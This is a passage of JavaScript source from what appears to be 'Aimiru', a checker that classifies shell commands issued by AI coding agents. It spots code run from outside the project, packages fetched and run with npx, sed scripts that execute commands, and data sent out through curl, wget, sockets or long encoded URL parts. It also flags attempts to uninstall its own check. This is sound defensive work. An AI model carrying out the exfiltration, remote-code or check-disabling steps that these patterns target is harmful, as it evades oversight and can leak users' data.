    if (!reason && spec.extra) reason = spec.extra(args, argDyn, ctx);
    return reason;
  }
  const compiler = COMPILER_DANGER[prog];
  if (compiler && args.some((a, k) => compiler.test(a) || (prog === 'rustc' && a === '-C' && /^(linker|link-arg)/.test(args[k + 1] ?? '')))) return `runs ${prog} with another program or plugin`;
  if (prog === 'go') {
    for (let k = 0; k < args.length; k += 1) {
      const m = /^--?([A-Za-z]+)(=(.*))?$/s.exec(args[k]);
      if (!m) continue;
      if (/^(toolexec|exec)$/.test(m[1])) return 'runs go with another program around its steps';
      if (/^(C|modfile|overlay|pkgdir)$/.test(m[1])) {
        const value = m[2] ? m[3] : args[k + 1];
        if (!insideProject(value, m[2] ? argDyn[k] : argDyn[k + 1], ctx)) return 'runs go on files outside the project';
      }
    }
    return null;
  }
  if (prog === 'mvn' || prog === 'mvnw') {
    for (const flag of ['-f', '--file', '-s', '--settings', '-gs', '--global-settings', '-t', '--toolchains']) {
      const value = flagValue(args, [flag]);
      if (value != null && !insideProject(value, false, ctx)) return `runs ${prog} on files outside the project`;
    }
    return null;
  }
  if (prog === 'java') {
    const check = (p, dyn) => insideProject(p, dyn, ctx);
    for (let k = 0; k < args.length; k += 1) {
      const a = args[k];
      if (a === '-jar') return check(args[k + 1], argDyn[k + 1]) ? null : 'runs a program from outside the project';
      const cp = /^(-cp|-classpath|--class-path|-p|--module-path|--upgrade-module-path)(=(.*))?$/s.exec(a);
      if (cp) {
        const value = cp[2] ? cp[3] : args[k + 1];
        if (!cp[2]) k += 1;
        if (String(value ?? '').split(/[:;]/).some((p) => p && !check(p, argDyn[k]))) return 'runs code from outside the project';
        continue;
      }
      const lib = /^-agentlib:([^=]*)/.exec(a);
      if (lib && lib[1] !== 'jdwp') return 'loads a native agent into java';
      const agent = /^-(javaagent|agentpath):([^=]*)/.exec(a);
      if (agent && !check(agent[2], argDyn[k])) return 'loads code from outside the project';
      if (a.startsWith('@') && !check(a.slice(1), argDyn[k])) return 'reads its options from outside the project';
      if (!a.startsWith('-')) {
        // The main class, or a source file run directly ("java Main.java").
        if (/\.java$/i.test(a) && !check(a, argDyn[k])) return 'runs a program from outside the project';
        break;
      }
    }
    return null;
  }
  return null;
}

/** Runners whose operand is a script file: the file must be in the project. */
const SCRIPT_RUNNERS = new Set(['tsx', 'ts-node', 'nodemon', 'vite-node', 'swift']);
const SCRIPT_FILE = /\.(m|c)?[jt]sx?$|\.swift$/i;

/** The scripts in package.json in a folder (pnpm db:types runs one), or an empty set. */
function packageScripts(dir) {
  if (!dir) return new Set();
  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8'));
    return new Set(Object.keys(pkg?.scripts && typeof pkg.scripts === 'object' ? pkg.scripts : {}));
  } catch {
    return new Set();
  }
}

// Package managers: their own options before the step (value-taking ones, the folder ones, the
// harmless switches), and the steps that are local work. Anything else is not known.
const PACKAGE_MANAGERS = {
  npm: {
    value: ['--prefix', '--workspace', '-w', '--loglevel'], dirs: ['--prefix'],
    bool: ['-s', '--silent', '-q', '--quiet', '-d', '--verbose', '--workspaces', '-ws', '--if-present', '--include-workspace-root', '-g', '--global', '-v', '--version', '-h', '--help'],
    steps: ['', 'run', 'run-script', 'rum', 'urn', 'test', 't', 'tst', 'start', 'restart', 'stop', 'ls', 'list', 'll', 'la', 'why', 'explain', 'version', 'pack', 'rebuild', 'rb', 'root', 'prefix', 'bin', 'help'],
    scripts: false,
  },
  pnpm: {
    value: ['--filter', '-F', '-C', '--dir', '--loglevel', '--reporter'], dirs: ['-C', '--dir'],
    bool: ['-r', '--recursive', '-w', '--workspace-root', '-s', '--silent', '--parallel', '--if-present', '--stream', '--aggregate-output', '--no-bail', '--sequential', '-v', '--version', '-h', '--help'],
    steps: ['', 'run', 'test', 't', 'start', 'ls', 'list', 'll', 'la', 'why', 'root', 'bin', 'help', 'build', 'lint', 'typecheck', 'format', 'dev'],
    scripts: true,
  },
  yarn: {
    value: ['--cwd'], dirs: ['--cwd'],
    bool: ['-s', '--silent', '--offline', '-v', '--version', '-h', '--help'],
    steps: ['run', 'test', 'start', 'list', 'why', 'bin', 'help', 'build', 'lint', 'typecheck', 'format', 'dev'],
    scripts: true,
  },
  bun: {
    value: ['--cwd', '--filter', '-F', '--config', '-c'], dirs: ['--cwd'],
    bool: ['--silent', '--bun', '--watch', '--hot', '--smol', '--if-present', '-v', '--version', '-h', '--help', '--revision'],
    steps: ['', 'run', 'test', 'build', 'help', 'lint', 'typecheck', 'format', 'dev', 'start'],
    scripts: true,
  },
};

/** A package manager's step after its own options, or why it is not known. */
function packageManagerInvocation(prog, args, argDyn, ctx) {
  const spec = PACKAGE_MANAGERS[prog];
  let dir = ctx.cwdUnknown ? null : ctx.cwd;
  for (let k = 0; k < args.length; k += 1) {
    const a = args[k];
    if (!a.startsWith('-')) return { sub: a.toLowerCase(), at: k, dynamic: Boolean(argDyn[k]), dir };
    const eq = a.indexOf('=');
    const name = eq === -1 ? a : a.slice(0, eq);
    if (spec.value.includes(name)) {
      const value = eq === -1 ? args[k + 1] : a.slice(eq + 1);
      const dyn = eq === -1 ? argDyn[k + 1] : argDyn[k];
      if (eq === -1) k += 1;
      if (spec.dirs.includes(name)) {
        if (!insideProject(value, dyn, ctx)) return { unknown: `runs ${prog} in a folder outside the project` };
        dir = resolvePathWord(value, ctx);
      }
      continue;
    }
    if (spec.bool.includes(name)) continue;
    return { unknown: `runs ${prog} with an option Aimiru does not know (${name})` };
  }
  return { sub: '', at: args.length, dynamic: false, dir };
}

/** True when a package manager's step is local work: a known step, or a script of the project. */
function packageStepIsLocal(prog, args, argDyn, ctx) {
  const pm = packageManagerInvocation(prog, args, argDyn, ctx);
  if (pm.unknown || pm.dynamic) return false;
  const spec = PACKAGE_MANAGERS[prog];
  const isFile = (t) => /[\\/]/.test(t) || SCRIPT_FILE.test(t);
  if (prog === 'bun' && pm.sub === 'run') {
    // bun run [its options] [--] <script or file>: a package.json script, or a file in the project.
    const run = bunRunTarget(args, argDyn, ctx, pm.at + 1);
    if (run.unknown) return false;
    if (run.target === undefined) return true; // lists the scripts
    if (run.dynamic) return false;
    if (packageScripts(pm.dir).has(run.target)) return true;
    return isFile(run.target) && insideProject(run.target, false, ctx);
  }
  // bun x.ts: a file, which must be in the project.
  if (prog === 'bun' && args[pm.at] !== undefined && isFile(args[pm.at])) return insideProject(args[pm.at], false, ctx);
  if (spec.steps.includes(pm.sub)) return true;
  return spec.scripts && packageScripts(pm.dir).has(args[pm.at]);
}

const BUN_RUN_VALUES = ['--filter', '-F', '--cwd', '--env-file', '--preload', '-r', '--shell', '--elide-lines', '--define', '-d', '--loader', '-l', '--tsconfig-override', '--conditions', '--main-fields', '--jsx-factory', '--jsx-fragment', '--jsx-import-source', '--jsx-runtime', '--external', '--port'];
const BUN_RUN_SWITCHES = ['--watch', '--hot', '--smol', '--silent', '--bun', '--if-present', '--no-clear-screen', '--workspaces', '--no-install', '--prefer-offline', '--inspect', '--inspect-brk', '--inspect-wait'];

/** What bun run runs, after its own options; options Aimiru does not know, or that load code from elsewhere, are unknown. */
function bunRunTarget(args, argDyn, ctx, from) {
  for (let k = from; k < args.length; k += 1) {
    const a = args[k];
    if (a === '--') return { target: args[k + 1], dynamic: Boolean(argDyn[k + 1]) };
    if (!a.startsWith('-')) return { target: a, dynamic: Boolean(argDyn[k]) };
    const eq = a.indexOf('=');
    const name = eq === -1 ? a : a.slice(0, eq);
    if (BUN_RUN_SWITCHES.includes(name)) continue;
    if (!BUN_RUN_VALUES.includes(name)) return { unknown: true };
    const value = eq === -1 ? args[k + 1] : a.slice(eq + 1);
    const dyn = eq === -1 ? argDyn[k + 1] : argDyn[k];
    if (eq === -1) k += 1;
    if (['--cwd', '--env-file', '--tsconfig-override'].includes(name) && !insideProject(value, dyn, ctx)) return { unknown: true };
    if (['--preload', '-r'].includes(name) && (dyn || /^[a-z][a-z0-9+.-]*:/i.test(String(value)) || (/[\\/]|^[.~]/.test(String(value)) && !insideProject(value, false, ctx)))) return { unknown: true };
    if (name === '--shell' && !['bun', 'system'].includes(String(value))) return { unknown: true };
  }
  return { target: undefined };
}

/**
 * A package spec that npx, pnpm dlx, yarn dlx or bunx would download and run: a listed project
 * tool ("vitest", "vitest@3.2.1") runs locally; any other plain name is a download ("other");
 * aliases, scoped names not listed, git, GitHub, file and web addresses are not known.
 */
function packageSpecKind(spec) {
  const m = /^((?:@[a-z0-9][a-z0-9._-]*\/)?[a-z0-9][a-z0-9._-]*)(?:@([^@/:\s]+))?$/i.exec(String(spec ?? ''));
  if (!m) return { kind: 'unknown' };
  const name = m[1].toLowerCase();
  const version = m[2];
  if (DEV_TOOLS.has(name) && (version === undefined || /^\d+\.\d+\.\d+(-[0-9a-z.-]+)?$/i.test(version))) return { kind: 'tool', program: DEV_TOOLS.get(name) };
  if (name.startsWith('@')) return { kind: 'unknown' };
  return { kind: 'download' };
}

/** Switches of npx, pnpm dlx, yarn dlx and bunx that change nothing about what runs. */
const DLX_SWITCHES = new Set(['-y', '--yes', '--no', '--no-install', '-q', '--quiet', '--silent', '-s', '--bun', '--ignore-existing', '--prefer-offline', '--offline']);

/** Classifies a command a package manager or tool runs for you, as its own simple command. */
function classifyWords(words, dyn, exp, quoted, ctx, out, depth) {
  if (!words.length) return;
  classifySegment({ words, dynamic: dyn, expand: exp, quoted, redirects: [], piped: false }, ctx, out, depth + 1);
}

/** npx <package> [args] and its kin: the package decides (see packageSpecKind). */
function classifyPackageRun(label, w, ctx, out, depth) {
  for (let k = 0; k < w.words.length; k += 1) {
    const a = w.words[k];
    if (/^(-p|--package)(=|$)/.test(a)) {
      unknownProgram(out, `${label} installs a package named with --package`);
      return;
    }
    const shell = /^(-c|--call|--shell-mode)(=(.*))?$/s.exec(a);
    if (shell) {
      const text = shell[2] ? [shell[3], ...w.words.slice(k + 1)].join(' ') : w.words.slice(k + 1).join(' ');
      classifyCommandText(text, w.dynamic.slice(k).some(Boolean), ctx, out, depth);
      return;
    }
    if (a === '--') continue;
    if (a.startsWith('-')) {
      if (DLX_SWITCHES.has(a)) continue;
      unknownProgram(out, `${label} with an option Aimiru does not know (${a})`);
      return;
    }
    if (w.dynamic[k] || w.expand[k]) {
      unknownProgram(out, `${label} runs a package named only when it runs`);
      return;
    }
    const kind = packageSpecKind(a);
    if (kind.kind === 'tool') {
      classifyWords([kind.program, ...w.words.slice(k + 1)], [false, ...w.dynamic.slice(k + 1)], [false, ...w.expand.slice(k + 1)], [false, ...w.quoted.slice(k + 1)], ctx, out, depth);
    } else if (kind.kind === 'unknown') {
      unknownProgram(out, `${label} runs ${a}, which is not a plain package name`);
    } else {
      out.classes.push('other');
      out.why.push(`downloads and runs ${a}`);
      // "npx vercel deploy", "bunx prisma migrate reset": the step is named all the same (ADR-0039).
      const name = a.startsWith('@') ? a : a.split('@')[0];
      const step = builderStep(name.toLowerCase(), w.words.slice(k + 1));
      if (step) {
        out.classes.push(step.cls);
        nameBuilderStep(out, step.resource);
      }
      // "npx aimiru-codex uninstall": a change to Codex's check, as "claude plugin uninstall" is.
      if (changesAimiruSetup(name, w.words.slice(k + 1), w.dynamic.slice(k + 1))) protectedChange(out, "changes Aimiru's check in Codex");
    }
    return;
  }
}

/** pnpm exec, yarn exec, poetry run, bundle exec, uv run: the command they run, after their switches. */
function classifyWrappedCommand(label, w, ctx, out, depth, { switches = [], shellFlags = [] } = {}) {
  let k = 0;
  for (; k < w.words.length; k += 1) {
    const a = w.words[k];
    if (a === '--') {
      k += 1;
      break;
    }
    if (!a.startsWith('-')) break;
    if (shellFlags.includes(a)) {
      classifyCommandText(w.words.slice(k + 1).join(' '), w.dynamic.slice(k + 1).some(Boolean), ctx, out, depth);
      return;
    }
    if (switches.includes(a)) continue;
    unknownProgram(out, `${label} with an option Aimiru does not know (${a})`);
    return;
  }
  classifyWords(w.words.slice(k), w.dynamic.slice(k), w.expand.slice(k), w.quoted.slice(k), ctx, out, depth);
}

/**
 * The package script a package manager runs (npm run deploy, pnpm release, yarn run ship,
 * bun run deploy), or null for one of its own steps. Its own options and their values are skipped.
 */
function packageScriptOf(prog, pm, args, argDyn, ctx) {
  if (!pm || pm.unknown || pm.dynamic) return null;
  const spec = PACKAGE_MANAGERS[prog];
  const isRun = prog === 'npm' ? ['run', 'run-script', 'rum', 'urn'].includes(pm.sub) : pm.sub === 'run';
  if (isRun) {
    if (prog === 'bun') {
      const run = bunRunTarget(args, argDyn, ctx, pm.at + 1);
      return run.unknown || run.dynamic ? null : run.target ?? null;
    }
    for (let k = pm.at + 1; k < args.length; k += 1) {
      const a = String(args[k]);
      if (a === '--') return args[k + 1] ?? null;
      if (a.startsWith('-')) {
        if (!a.includes('=') && spec.value.includes(a)) k += 1;
        continue;
      }
      return argDyn[k] ? null : a;
    }
    return null;
  }
  // pnpm deploy, yarn release, bun ship: a script named as the step (npm has no such form).
  if (prog !== 'npm' && pm.sub && !spec.steps.includes(pm.sub)) return pm.sub;
  return null;
}

/** The project file bun runs as a program (bun x.ts, bun run x.ts), or null for a package script. */
function bunProgramFile(args, argDyn, ctx, pm) {
  if (!pm || pm.unknown || pm.dynamic) return null;
  const isFile = (t) => /[\\/]/.test(t) || SCRIPT_FILE.test(t);
  if (pm.sub === 'run') {
    const run = bunRunTarget(args, argDyn, ctx, pm.at + 1);
    if (run.unknown || run.dynamic || run.target === undefined) return null;
    return isFile(run.target) && !packageScripts(pm.dir).has(run.target) ? run.target : null;
  }
  const first = args[pm.at];
  return first !== undefined && isFile(first) ? first : null;
}

/** The tasks turbo and nx are asked to run: turbo run deploy, nx deploy app, nx run app:deploy, nx run-many -t deploy. */
function taskRunnerTargets(prog, args) {
  const steps = args.filter((a) => !String(a).startsWith('-')).map(String);
  const valuesOf = (names) => {
    const out = [];
    args.forEach((a, k) => {
      const m = /^(--?[a-z-]+)(=(.*))?$/i.exec(String(a));
      if (!m || !names.includes(m[1])) return;
      const v = m[2] !== undefined ? m[3] : args[k + 1];
      if (v !== undefined) out.push(...String(v).split(','));
    });
    return out;
  };
  if (prog === 'turbo') {
    const from = steps[0] === 'run' ? 1 : 0;
    return steps.slice(from);
  }
  // nx
  if (steps[0] === 'run') return steps[1] ? [steps[1].split(':')[1] ?? ''] : [];
  if (steps[0] === 'run-many' || steps[0] === 'affected') return valuesOf(['-t', '--target', '--targets']);
  return steps[0] ? [steps[0]] : [];
}

/** A slice of a segment's words with their flags. */
function wordsFrom(words, dynamic, expand, quoted, start) {
  return { words: words.slice(start), dynamic: dynamic.slice(start), expand: expand.slice(start), quoted: (quoted || []).slice(start) };
}

// sed's long options (GNU sed 4.9): the ones that take a value, and the switches.
const SED_LONG_VALUE = ['expression', 'file', 'line-length'];
const SED_LONG = [...SED_LONG_VALUE, 'in-place', 'follow-symlinks', 'null-data', 'zero-terminated', 'posix', 'quiet', 'silent', 'regexp-extended', 'separate', 'sandbox', 'unbuffered', 'debug', 'help', 'version', 'binary'];

/**
 * sed's scripts (-e, --expression and any prefix of it, or the first operand), its script files
 * (-f, --file), and the files it edits. `ambiguous` when a long option prefix fits several names.
 */
function sedInvocation(args) {
  const scripts = [];
  const scriptFiles = [];
  const operands = [];
  let ambiguous = false;
  let hasScriptOption = false;
  for (let k = 0; k < args.length; k += 1) {
    const a = args[k];
    if (a === '--') {
      operands.push(...args.slice(k + 1));
      break;
    }
    if (a.startsWith('--')) {
      const eq = a.indexOf('=');
      const r = resolveLong(a.slice(2, eq === -1 ? undefined : eq), SED_LONG);
      if (r.ambiguous) ambiguous = true;
      if (!SED_LONG_VALUE.includes(r.name)) continue;
      const value = eq === -1 ? args[++k] ?? '' : a.slice(eq + 1);
      if (r.name === 'expression') scripts.push(value);
      if (r.name === 'file') scriptFiles.push(value);
      if (r.name !== 'line-length') hasScriptOption = true;
      continue;
    }
    if (!a.startsWith('-') || a === '-') {
      operands.push(a);
      continue;
    }
    for (let j = 1; j < a.length; j += 1) {
      const ch = a[j];
      if (ch === 'e' || ch === 'f' || ch === 'l') {
        const value = a.slice(j + 1) || (args[++k] ?? '');
        if (ch === 'e') scripts.push(value);
        if (ch === 'f') scriptFiles.push(value);
        if (ch !== 'l') hasScriptOption = true;
        break;
      }
      if (ch === 'i') break; // -i[SUFFIX]: the rest is a suffix ("-ie" is not -e)
    }
  }
  if (!hasScriptOption && operands.length) scripts.push(operands.shift());
  return { scripts, scriptFiles, files: operands, ambiguous };
}

/**
 * What a sed script does beyond editing text: runs commands (the e command, s///e), or writes
 * files (w, W, s///w). A script Aimiru cannot read is treated as running commands.
 */
function sedScriptEffects(script) {
  const s = String(script ?? '');
  const n = s.length;
  const writes = [];
  let i = 0;
  const unreadable = { runs: true, writes };
  const ws = () => {
    while (i < n && (s[i] === ' ' || s[i] === '\t')) i += 1;
  };
  const regex = (d) => {
    while (i < n && s[i] !== d) {
      if (s[i] === '\\') i += 1;
      else if (s[i] === '\n') return false;
      i += 1;
    }
    if (i >= n) return false;
    i += 1;
    return true;
  };
  const address = () => {
    if (/\d/.test(s[i] || '')) {
      while (/\d/.test(s[i] || '')) i += 1;
      if (s[i] === '~') {
        i += 1;
        while (/\d/.test(s[i] || '')) i += 1;
      }
      return true;
    }
    if (s[i] === '$') {
      i += 1;
      return true;
    }
    if (s[i] === '/' || s[i] === '\\') {
      const d = s[i] === '/' ? '/' : s[i + 1];
      i += s[i] === '/' ? 1 : 2;
      if (!d || !regex(d)) return null;
      while (/[IM]/.test(s[i] || '')) i += 1;
      return true;
    }
    return false;
  };
  const toEol = () => {
    const start = i;
    while (i < n && s[i] !== '\n') i += 1;
    return s.slice(start, i).trim();
  };
  while (i < n) {
    ws();
    if (i >= n) break;
    if (/[;\n{}]/.test(s[i])) {
      i += 1;
      continue;
    }
    if (s[i] === '#') {
      toEol();
      continue;
    }
    const a1 = address();
    if (a1 === null) return unreadable;
    if (a1) {
      ws();
      if (s[i] === ',') {
        i += 1;
        ws();
        if (s[i] === '+' || s[i] === '~') {
          i += 1;
          while (/\d/.test(s[i] || '')) i += 1;
        } else if (!address()) return unreadable;
      }
    }
    ws();
    while (s[i] === '!') {
      i += 1;
      ws();
    }
    const cmd = s[i];
    i += 1;
    switch (cmd) {
      case 'e':
        return { runs: true, writes };
      case 's': {
        const d = s[i];
        i += 1;
        if (!d || d === '\n' || d === '\\' || !regex(d) || !regex(d)) return unreadable;
        while (i < n && /[gpiImMe0-9w]/.test(s[i])) {
          if (s[i] === 'e') return { runs: true, writes };
          if (s[i] === 'w') {
            i += 1;
            ws();
            writes.push(toEol());
            break;
          }
          i += 1;
        }
        break;
      }
      case 'y': {
        const d = s[i];
        i += 1;
        if (!d || d === '\n' || d === '\\' || !regex(d) || !regex(d)) return unreadable;
        break;
      }
      case 'a':
      case 'i':
      case 'c':
        while (i < n && s[i] !== '\n') i += s[i] === '\\' ? 2 : 1;
        break;
      case 'r':
      case 'R':
        toEol();
        break;
      case 'w':
      case 'W':
        ws();
        writes.push(toEol());
        break;
      case 'b':
      case 't':
      case 'T':
      case ':':
        while (i < n && s[i] !== ';' && s[i] !== '\n') i += 1;
        break;
      case 'q':
      case 'Q':
      case 'l':
      case 'L':
        ws();
        while (/\d/.test(s[i] || '')) i += 1;
        break;
      case 'v':
        while (i < n && !/[;\n}]/.test(s[i])) i += 1;
        break;
      case '=': case 'd': case 'D': case 'g': case 'G': case 'h': case 'H': case 'n': case 'N':
      case 'p': case 'P': case 'x': case 'z': case 'F': case '{': case '}':
        break;
      default:
        return unreadable;
    }
  }
  return { runs: false, writes };
}

/**
 * True when a path word names somewhere inside the project itself. Temp folders count as the
 * project only for reading and writing files, never for code that is run or loaded: anything can
 * be put there first.
 */
function insideProject(word, isDynamic, ctx) {
  if (isDynamic || word == null || word === '') return false;
  const p = resolvePathWord(word, ctx);
  return Boolean(p) && (p === ctx.project || p.startsWith(ctx.project.endsWith(path.sep) ? ctx.project : ctx.project + path.sep));
}

/** True when a path word names somewhere inside the project or a temp folder. */
function insideWorkArea(word, isDynamic, ctx) {
  if (isDynamic || word == null || word === '') return false;
  const p = resolvePathWord(word, ctx);
  return Boolean(p) && isInsideWorkArea(p, ctx);
}

/** True for a program Aimiru knows as local work (see LOCAL_PROGRAMS, LOCAL_STEPS). */
function isLocalWork(prog, word, args, argDyn, ctx) {
  if (/[\\/]/.test(word)) {
    // By path: a project script or tool is local work; elsewhere only the system folders are trusted.
    if (insideProject(word, false, ctx)) return true;
    const p = resolvePathWord(word, ctx);
    if (!p || !SYSTEM_BIN_DIRS.includes(path.dirname(p))) return false;
  }
  if (PACKAGE_MANAGERS[prog]) return packageStepIsLocal(prog, args, argDyn, ctx);
  // tsx x.ts, swift x.swift: the script must be in the project.
  if (SCRIPT_RUNNERS.has(prog) && args.some((a, k) => !a.startsWith('-') && (/[\\/]/.test(a) || SCRIPT_FILE.test(a)) && !insideProject(a, argDyn[k], ctx))) return false;
  if (LOCAL_PROGRAMS.has(prog)) return true;
  const steps = LOCAL_STEPS[prog];
  if (!steps) return false;
  const k = args.findIndex((a) => !a.startsWith('-'));
  if (k >= 0 && argDyn[k]) return false;
  return steps.includes(k >= 0 ? args[k].toLowerCase() : '');
}

function baseName(word) {
  const w = String(word || '').replace(/\\/g, '/');
  return w.slice(w.lastIndexOf('/') + 1).toLowerCase().replace(/\.exe$/, '');
}

function nonFlags(args) {
  return args.filter((a) => !a.startsWith('-'));
}

function hasSeq(args, seq) {
  const nf = nonFlags(args).map((a) => a.toLowerCase());
  for (let i = 0; i + seq.length <= nf.length; i += 1) {
    if (seq.every((s, k) => nf[i + k] === s || (s.endsWith('*') && nf[i + k]?.startsWith(s.slice(0, -1))))) return true;
  }
  return false;
}

function firstNonFlag(args) {
  return nonFlags(args)[0]?.toLowerCase() ?? '';
}

function flagValue(args, names) {
  for (let i = 0; i < args.length; i += 1) {
    const a = args[i];
    for (const n of names) {
      if (a === n && i + 1 < args.length) return args[i + 1];
      if (a.startsWith(`${n}=`)) return a.slice(n.length + 1);
    }
  }
  return null;
}

function httpMethodOf(prog, args) {
  const explicit = flagValue(args, ['-X', '--request', '-Method', '-method']);
  if (explicit) return explicit.toUpperCase();
  // curl -XPOST and -sXPOST: the method in the same word as its option (ADR-0146).
  if (prog === 'curl') {
    const glued = readOptions(args, [], CURL_OPTIONS).values.filter((v) => v.kind === 'method').pop();
    if (glued?.value) return String(glued.value).toUpperCase();
  }
  if (prog === 'curl' && args.some((a) => /^(-d|--data|--data-raw|--data-binary|--data-urlencode|--json|-F|--form|-T|--upload-file)(=|$)/.test(a) || /^-d./.test(a))) return 'POST';
  if (prog === 'wget' && args.some((a) => /^--post-(data|file)/.test(a))) return 'POST';
  if ((prog === 'http' || prog === 'https' || prog === 'xh' || prog === 'httpie') && /^(POST|PUT|PATCH|DELETE)$/i.test(args[0] || '')) return args[0].toUpperCase();
  if ((prog === 'http' || prog === 'https' || prog === 'xh') && args.some((a) => /^[A-Za-z0-9_-]+(=|:=)/.test(a))) return 'POST';
  return 'GET';
}

// ---------------------------------------------------------------------------
// Data leaving for a new place (ADR-0146): one rule for every network client
// ---------------------------------------------------------------------------

/** What a plain web read names (ADR-0146): class read, with its host as counterparty. */
export const WEB_READ_RESOURCE = 'net.get';

/** A request with one of these methods only reads; any other method can carry data. */
const READING_METHODS = new Set(['GET', 'HEAD']);

/**
 * 48 or more letters, digits and + / = _ - in one part of an address: longer than a commit id or a
 * UUID, the length data takes once it is encoded (ADR-0146).
 */
const DATA_RUN = /[A-Za-z0-9+/=_-]{48,}/;

/** Option values that make a request carry data, or send it to addresses Aimiru cannot see. */
const DATA_KINDS = new Set(['data', 'config', 'urls']);

/** A network call in code given on the command line (python -c, node -e, ruby -e, perl -e, php -r, bun -e). */
const NETWORK_CALL_RE = /\b(socket|http\.client|urllib\d?|requests|httpx|aiohttp|fetch\s*\(|net\.connect|XMLHttpRequest|WebSocket|axios|Net::HTTP|TCPSocket|IO::Socket|LWP|fsockopen|curl_init|Deno\.connect|Bun\.connect)/;

/**
 * True for a host that is this computer (ADR-0146; CONTRACT.md, "Steps that reach the network"):
 * exactly localhost or a name ending in .localhost, a 127.0.0.0/8 address, ::1 or 0.0.0.0. Data sent
 * there does not leave the computer. An exact match on the whole host, never a prefix or a part of
 * it: 127.0.0.1.example.com and localhost.example.com are other computers, and so is 127.999.0.1 or
 * 127.0.0.01, which a resolver may look up as a name.
 */
export function isLoopbackHost(host) {
  const raw = String(host ?? '').trim().toLowerCase().replace(/^\[(.*)\]$/, '$1');
  if (!raw) return false;
  // A name may end with the root's dot (localhost.); an address may not.
  const name = raw.replace(/\.$/, '');
  if (name === 'localhost' || (name.endsWith('.localhost') && /^[a-z0-9.-]+$/.test(name))) return true;
  if (raw === '::1' || raw === '0.0.0.0') return true;
  if (isLoopbackIPv4(raw)) return true;
  // 127.x.y.z inside an IPv6 address: ::ffff:127.0.0.1, or ::ffff:7f00:1 as the address parser writes it.
  const mapped = /^::ffff:(.+)$/.exec(raw);
  return Boolean(mapped) && (isLoopbackIPv4(mapped[1]) || /^7f[0-9a-f]{2}:[0-9a-f]{1,4}$/.test(mapped[1]));
}

/** 127.x.y.z written the one way every resolver reads alike: four whole numbers up to 255, none with a leading 0. */
function isLoopbackIPv4(h) {
  const parts = h.split('.');
  return parts.length === 4 && parts[0] === '127' && parts.every((p) => /^(0|[1-9]\d{0,2})$/.test(p) && Number(p) <= 255);
}

/**
 * Where one address goes: {host, unknown, local}. host is the full host name, lowercase, with no
 * port and no sign-in (null when the address cannot be read); unknown is true when the host is
 * built when the command runs ($HOST, $(...), backticks); local is true for this computer (a
 * loopback host, or a file: address). An address with no scheme is read as the client reads it:
 * "example.com/x" with `scheme`, and ":3000/x" (httpie and xh) as this computer.
 */
function webTarget(word, { dynamic = false, scheme = 'http' } = {}) {
  let w = String(word ?? '').trim();
  if (!w) return { host: null, unknown: false, local: false };
  const schemed = /^[a-z][a-z0-9+.-]*:\/\//i.test(w);
  const authority = (schemed ? w.slice(w.indexOf('://') + 3) : w).split(/[/?#]/)[0];
  if (dynamic && /[$`]/.test(authority)) return { host: null, unknown: true, local: false };
  if (/^file:/i.test(w)) return { host: null, unknown: false, local: true };
  if (!schemed && w.startsWith(':')) w = `localhost${w}`;
  try {
    const host = new URL(schemed ? w : `${scheme}://${w}`).hostname.toLowerCase().replace(/^\[(.*)\]$/, '$1') || null;
    return { host, unknown: false, local: isLoopbackHost(host) };
  } catch {
    return { host: null, unknown: false, local: false };
  }
}

/**
 * True when an address carries data by itself (ADR-0146): a part built when the command runs, a
 * sign-in in it, a part Aimiru would hide as a secret (redactSecrets), or a path part, query name or
 * query value of 48 or more letters, digits and + / = _ - (raw or decoded). A shorter address can
 * still carry a few words, and a host name is not read for data; the trust page says both.
 * @param {string} url
 * @param {{dynamic?: boolean}} [opts]  dynamic: the shell builds part of it when the command runs.
 */
export function urlCarriesData(url, { dynamic = false } = {}) {
  const s = String(url ?? '').trim();
  if (!s) return false;
  if (dynamic) return true;
  if (redactSecrets(s) !== s) return true;
  let u;
  try {
    u = new URL(/^[a-z][a-z0-9+.-]*:\/\//i.test(s) ? s : `http://${s.startsWith(':') ? `localhost${s}` : s}`);
  } catch {
    return DATA_RUN.test(s);
  }
  if (u.username || u.password) return true;
  const query = u.search.slice(1).split('&').flatMap((q) => {
    const eq = q.indexOf('=');
    return eq === -1 ? [q] : [q.slice(0, eq), q.slice(eq + 1)];
  });
  return [...u.pathname.split('/'), ...query].some((part) => DATA_RUN.test(part) || DATA_RUN.test(decodedPart(part)));
}

function decodedPart(part) {
  try {
    return decodeURIComponent(part);
  } catch {
    return part;
  }
}

/*
 * How each network client's options are read (ADR-0146). For each option that takes a value, what
 * the value is:
 *   data    the request sends it, or what it names: data, a file, cookies, a sign-in;
 *   config  options read from a file (or wget's settings), which can add data and addresses;
 *   urls    addresses read from a file;
 *   url     an address;
 *   method  the method;
 *   header  a header: data when built when it runs, read from a file (@file) or holding a secret;
 *   route   another computer in between, or other name lookups: the address may not say where it goes;
 *   socket  a socket file on this computer instead of the network;
 *   sent    sent as written: data only when built when it runs or holding a secret;
 *   save    the file the answer is saved to (a file this command writes; never data that leaves);
 *   local   stays on this computer (time limits, logs, certificates to trust).
 * flags: options with no value that matter (head; data: a saved sign-in; remotename and download: the
 * answer is saved under a name taken from the address; listen, scan, socket for nc).
 * Any other option takes no value. long options may be shortened to any unique start when
 * `abbreviate` (wget, httpie). nPrefix: wget's two-letter -nv, -nc, -nd, -nH, -np.
 */
const localKinds = (names) => Object.fromEntries(names.split(' ').map((n) => [n, 'local']));

const CURL_OPTIONS = {
  short: { A: 'sent', b: 'data', c: 'local', C: 'sent', d: 'data', D: 'local', e: 'sent', E: 'data', F: 'data', h: 'local', H: 'header', K: 'config', m: 'local', o: 'save', P: 'sent', Q: 'data', r: 'sent', t: 'sent', T: 'data', u: 'data', U: 'data', w: 'local', x: 'route', X: 'method', y: 'local', Y: 'local', z: 'sent' },
  flags: { I: 'head', n: 'data', O: 'remotename', J: 'remotename', head: 'head', netrc: 'data', 'netrc-optional': 'data', 'remote-name': 'remotename', 'remote-name-all': 'remotename', 'remote-header-name': 'remotename' },
  long: {
    data: 'data', 'data-ascii': 'data', 'data-binary': 'data', 'data-raw': 'data', 'data-urlencode': 'data', json: 'data',
    form: 'data', 'form-string': 'data', 'upload-file': 'data', 'url-query': 'data', cookie: 'data', user: 'data',
    'oauth2-bearer': 'data', variable: 'data', 'netrc-file': 'data', 'aws-sigv4': 'data', 'mail-auth': 'data',
    'mail-from': 'data', 'mail-rcpt': 'data', quote: 'data', 'proxy-user': 'data', tlsuser: 'data', tlspassword: 'data',
